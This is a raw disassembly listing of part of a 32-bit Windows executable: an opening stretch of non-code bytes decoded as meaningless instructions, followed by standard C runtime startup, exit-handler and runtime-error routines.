  422608:	push   eax
  422609:	xchg   ebx,eax
  42260a:	leave  
  42260b:	loope  0x422622
  42260d:	pop    eax
  42260e:	daa    
  42260f:	inc    ecx
  422610:	sbb    ecx,DWORD PTR [edi]
  422612:	lds    ebx,FWORD PTR [ebx+0x3e]
  422615:	pop    eax
  422616:	or     dh,cl
  422618:	addr16 push es
  42261a:	push   cs
  42261b:	sub    DWORD PTR [ebx+0x2ae174fe],eax
  422621:	cwde   
  422622:	jae    0x42261d
  422624:	dec    ecx
  422625:	xchg   ecx,eax
  422626:	pop    esp
  422627:	imul   ebx,DWORD PTR [edi-0x43],0x0
  42262b:	push   ebp
  42262c:	cld    
  42262d:	add    BYTE PTR [edi*4+0x3a188ac7],bh
  422634:	test   DWORD PTR [esi-0x33],ecx
  422637:	fnstcw WORD PTR [ebx]
  422639:	push   esp
  42263a:	fist   WORD PTR [ebp+0x76]
  42263d:	rcr    DWORD PTR [edx-0x5ab5f3b2],0x72
  422644:	or     edx,DWORD PTR [edi]
  422646:	in     al,0x10
  422648:	xchg   ecx,eax
  422649:	pop    ecx
  42264a:	mov    ds:0x3d39926f,eax
  42264f:	mov    DWORD PTR [ebp+0x4c38da57],esp
  422655:	sub    eax,0xa4a82b0d
  42265a:	aad    0x89
  42265c:	(bad)  
  42265d:	dec    esp
  42265e:	mov    bl,dh
  422660:	dec    esi
  422661:	push   es
  422662:	push   ds
  422663:	jecxz  0x422674
  422665:	sbb    edx,edi
  422667:	mov    ds:0x10c3b4b9,eax
  42266c:	pop    edx
  42266d:	in     al,0xb1
  42266f:	retf   0x9518
  422672:	push   cs
  422673:	xor    BYTE PTR [esi-0x6e284cf2],ah
  422679:	pop    edx
  42267a:	mov    cl,0x78
  42267c:	adc    dh,BYTE PTR [ecx]
  42267e:	js     0x422675
  422680:	psllq  mm5,QWORD PTR [eax-0x3e5bb82a]
  422687:	xchg   edx,eax
  422688:	mov    esi,0x330bb9a8
  42268d:	aas    
  42268e:	popa   
  42268f:	mov    ebx,0x624f621c
  422694:	mov    ds:0xe79d235,al
  422699:	cmp    al,0xd8
  42269b:	(bad)  
  42269c:	xchg   edx,eax
  42269d:	(bad)  [ebx]
  42269f:	push   esp
  4226a0:	fcom   DWORD PTR [edi]
  4226a2:	xor    esp,DWORD PTR [ebp-0x7f]
  4226a5:	gs leave 
  4226a7:	scas   al,BYTE PTR es:[edi]
  4226a8:	cmp    esi,DWORD PTR [edi+0x140a8b47]
  4226ae:	hlt    
  4226af:	sbb    BYTE PTR [ebx],cl
  4226b1:	nop
  4226b2:	jns    0x4226f4
  4226b4:	push   ds
  4226b5:	mov    al,ds:0x2802874
  4226ba:	dec    edx
  4226bb:	inc    ecx
  4226bc:	ror    BYTE PTR [ebp+eax*1-0x122f5c1b],cl
  4226c3:	mov    ah,0xd0
  4226c5:	sbb    eax,0xecfcd566
  4226ca:	shl    BYTE PTR [edx-0x23],cl
  4226cd:	je     0x422717
  4226cf:	xor    DWORD PTR [ecx+0x6e],ebx
  4226d2:	pop    edi
  4226d3:	jle    0x4226b9
  4226d5:	push   eax
  4226d6:	mov    dh,0x71
  4226d8:	es sahf 
  4226da:	sbb    BYTE PTR [edx-0x16ecba6d],0xe4
  4226e1:	mov    ?,WORD PTR [edx-0x69fabb1]
  4226e7:	push   cs
  4226e8:	push   cs
  4226e9:	push   ebp
  4226ea:	push   0xde030c09
  4226ef:	mov    cl,0x75
  4226f1:	in     eax,dx
  4226f2:	sbb    ebp,DWORD PTR [ecx+0x58700031]
  4226f8:	adc    BYTE PTR [edi-0x32],bh
  4226fb:	xchg   edx,eax
  4226fc:	nop
  4226fd:	fadd   QWORD PTR [eax+0x6c]
  422700:	call   0xf4f:0x95d67e62
  422707:	stos   DWORD PTR es:[edi],eax
  422708:	js     0x422780
  42270a:	push   ss
  42270b:	inc    ecx
  42270c:	or     DWORD PTR [edx+esi*8-0x24f133c9],ebp
  422713:	ins    BYTE PTR es:[edi],dx
  422714:	mov    ecx,0x1be9006
  422719:	mov    ecx,0x17d32fb1
  42271e:	outs   dx,DWORD PTR ds:[esi]
  42271f:	pushw  cs
  422721:	repz leave 
  422723:	ret    0xd2b6
  422726:	enter  0x544b,0x6b
  42272a:	inc    edi
  42272b:	and    ebp,ecx
  42272d:	add    eax,DWORD PTR [esi+0x3c]
  422730:	lea    edi,[eax+edi*1+0x29]
  422734:	cli    
  422735:	data16 mov al,0x8a
  422738:	xchg   esp,eax
  422739:	outs   dx,DWORD PTR ds:[esi]
  42273a:	test   eax,0x66d027cd
  42273f:	sub    eax,0x3779c497
  422744:	scas   al,BYTE PTR es:[edi]
  422745:	mov    eax,ds:0x99b33c68
  42274a:	cmc    
  42274b:	adc    al,0x57
  42274d:	pop    edi
  42274e:	adc    eax,0xe12251a3
  422753:	sbb    edi,DWORD PTR [edx-0x27f81a3a]
  422759:	int    0x3b
  42275b:	ret    0x6bb5
  42275e:	pop    edi
  42275f:	xchg   edx,eax
  422760:	or     DWORD PTR [edi+ebp*1+0x33df0d97],eax
  422767:	mov    eax,0xebb52e4e
  42276c:	and    esp,esi
  42276e:	stc    
  42276f:	hlt    
  422770:	js     0x42275a
  422772:	sub    al,0x3d
  422774:	sub    al,0x4a
  422776:	sub    bh,ah
  422778:	jg     0x4227ae
  42277a:	push   0x20
  42277c:	or     eax,DWORD PTR [esi+ecx*4+0x75]
  422780:	cmc    
  422781:	lds    ebp,FWORD PTR [eax-0x69ce0252]
  422787:	ret    
  422788:	inc    edx
  422789:	mov    edx,DWORD PTR cs:[edi+0x36]
  42278d:	adc    ecx,DWORD PTR ds:0xc2ea2c18
  422793:	ror    DWORD PTR [edx+0x3c2de22e],1
  422799:	ret    
  42279a:	lods   eax,DWORD PTR ds:[esi]
  42279b:	and    eax,DWORD PTR [esi]
  42279d:	repz xchg esp,eax
  42279f:	pop    edi
  4227a0:	out    dx,eax
  4227a1:	add    ah,BYTE PTR [ecx+edi*4+0x6c36d3c3]
  4227a8:	ficom  WORD PTR ds:0xd1ff3fca
  4227ae:	retf   
  4227af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b0:	jge    0x422742
  4227b2:	push   esp
  4227b3:	loope  0x422765
  4227b5:	inc    edi
  4227b6:	nop
  4227b7:	(bad)  
  4227b9:	mov    edi,0x2148b6f
  4227be:	daa    
  4227bf:	xlat   BYTE PTR ds:[ebx]
  4227c0:	shl    DWORD PTR [edx],cl
  4227c2:	pop    ebx
  4227c3:	fisub  DWORD PTR [ebx-0x3990f68f]
  4227c9:	jle    0x4227e4
  4227cb:	sub    bl,BYTE PTR [ebx]
  4227cd:	inc    ebx
  4227ce:	iret   
  4227cf:	inc    edi
  4227d0:	fcmove st,st(0)
  4227d2:	mov    bh,0xf5
  4227d4:	aad    0xed
  4227d6:	fs mov edi,0xa51a5167
  4227dc:	jle    0x42280f
  4227de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227df:	inc    ebx
  4227e0:	in     eax,0xc0
  4227e2:	aam    0x9d
  4227e4:	jmp    0x4227d3
  4227e6:	xchg   edi,eax
  4227e7:	call   DWORD PTR [edi+0xd724f27]
  4227ed:	pusha  
  4227ee:	sti    
  4227ef:	int3   
  4227f0:	push   esp
  4227f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227f2:	mov    cl,0x81
  4227f4:	call   0x34:0x9b18ade7
  4227fb:	lock call DWORD PTR [ecx-0x56]
  4227ff:	or     DWORD PTR [esi],0xfffffff8
  422802:	sbb    ah,BYTE PTR [ecx-0x13]
  422805:	pop    esp
  422806:	push   ecx
  422807:	das    
  422808:	imul   ebp,DWORD PTR [edi-0x14d730ce],0xffffffbf
  42280f:	test   eax,0xb8113ba7
  422814:	(bad)  
  422816:	xchg   esp,eax
  422817:	in     eax,dx
  422818:	mov    edx,0xa3f4f962
  42281d:	adc    DWORD PTR ss:[edx+0x41dfc666],esp
  422824:	mov    esi,0x22ab2bc4
  422829:	ds xchg esp,eax
  42282b:	test   al,0xae
  42282d:	adc    edi,esi
  42282f:	daa    
  422830:	sbb    ebx,edi
  422832:	push   es
  422833:	nop
  422834:	in     al,dx
  422835:	rcl    ebx,0x60
  422838:	mov    ebx,0xa3863502
  42283d:	in     al,0x4a
  42283f:	inc    ecx
  422840:	inc    edi
  422841:	jne    0x422897
  422843:	jp     0x42286c
  422845:	xchg   ecx,eax
  422846:	push   esp
  422847:	xor    al,0x72
  422849:	out    0x9d,eax
  42284b:	mov    eax,ds:0x20647ab3
  422850:	cmp    ch,ch
  422852:	push   edi
  422853:	js     0x4227f9
  422855:	pop    eax
  422856:	outs   dx,DWORD PTR ds:[esi]
  422857:	adc    DWORD PTR [ecx+0x5a],esi
  42285a:	test   al,0x13
  42285c:	ret    0x1f6b
  42285f:	test   BYTE PTR [ebx-0x51],dl
  422862:	ja     0x4228ca
  422864:	and    cl,bh
  422866:	mov    dl,0x2d
  422868:	(bad)  
  422869:	je     0x4228cb
  42286b:	and    BYTE PTR [eax+ebx*2-0x5f],al
  42286f:	pop    ebp
  422870:	popa   
  422871:	jecxz  0x422828
  422873:	je     0x42282f
  422875:	mov    ds:0x2f5ac853,eax
  42287a:	repz daa 
  42287c:	bound  ebx,QWORD PTR [ecx]
  42287e:	retf   0x5a3d
  422881:	dec    eax
  422882:	pop    edi
  422883:	icebp  
  422884:	mov    bh,BYTE PTR [edx]
  422886:	mov    al,ds:0xba40c403
  42288b:	sub    DWORD PTR [edx+0x630ce988],ecx
  422891:	push   0x66
  422893:	ret    
  422894:	lock ja 0x42288d
  422897:	push   0xd86e068e
  42289c:	out    0x25,al
  42289e:	mov    esp,0xe01fa937
  4228a3:	imul   ebx,DWORD PTR [eax+0x6f59e2b6],0x75
  4228aa:	lock inc esi
  4228ac:	or     BYTE PTR [ecx-0x68f8616e],al
  4228b2:	rcl    bl,cl
  4228b4:	and    DWORD PTR [edx-0xb],0xffffffe8
  4228b8:	push   eax
  4228b9:	pop    esp
  4228ba:	mov    al,0x3f
  4228bc:	scas   al,BYTE PTR es:[edi]
  4228bd:	dec    eax
  4228be:	mov    edi,0xd0618566
  4228c3:	cmc    
  4228c4:	retf   
  4228c5:	push   edi
  4228c6:	hlt    
  4228c7:	jns    0x42289a
  4228c9:	xchg   ebp,eax
  4228ca:	push   ebp
  4228cb:	push   ds
  4228cc:	jmp    0xce37:0x1a3afe04
  4228d3:	pusha  
  4228d4:	jbe    0x422905
  4228d6:	sahf   
  4228d7:	cmp    al,al
  4228d9:	sub    DWORD PTR cs:[edx],0x54487858
  4228e0:	out    0x5f,al
  4228e2:	cs jns 0x42292c
  4228e5:	add    BYTE PTR [esi+0x4f],ch
  4228e8:	out    0x87,al
  4228ea:	stos   BYTE PTR es:[edi],al
  4228eb:	inc    ebx
  4228ec:	call   0x648eb359
  4228f1:	dec    esi
  4228f2:	out    dx,eax
  4228f3:	mov    DWORD PTR [edi+0x6a],0xb750c696
  4228fa:	jb     0x42290a
  4228fc:	add    edi,edi
  4228fe:	in     al,dx
  4228ff:	leave  
  422900:	rcr    DWORD PTR [ebx+0x6d976539],1
  422906:	add    bh,al
  422908:	pop    ecx
  422909:	and    BYTE PTR [esp+ebp*2-0x369041f3],ch
  422910:	mov    dl,0x4e
  422912:	repnz shr BYTE PTR [ebx+0x1c],cl
  422916:	pop    eax
  422917:	sub    al,0xe2
  422919:	mov    BYTE PTR [edi+0x327b412c],ch
  42291f:	hlt    
  422920:	shr    DWORD PTR [eax],0x7d
  422923:	btc    DWORD PTR [esi-0x5f13840a],ebx
  42292a:	adc    BYTE PTR [esp+eiz*2],bh
  42292d:	shl    eax,1
  42292f:	sub    esp,DWORD PTR [ecx]
  422931:	pop    esi
  422932:	fst    QWORD PTR [edx+0x20]
  422935:	(bad)  
  422936:	cmp    ebx,DWORD PTR ds:0xd5f04731
  42293c:	aas    
  42293d:	jl     0x4229a5
  42293f:	clc    
  422940:	jns    0x42297b
  422942:	das    
  422943:	mov    ds:0x9410aa1d,eax
  422948:	inc    eax
  422949:	pop    eax
  42294a:	cmp    al,bh
  42294c:	mov    cl,0xbd
  42294e:	push   0x2edef534
  422953:	scas   eax,DWORD PTR es:[edi]
  422954:	inc    ebx
  422955:	inc    ebp
  422956:	cmp    BYTE PTR [ecx-0x3fcc95aa],dh
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
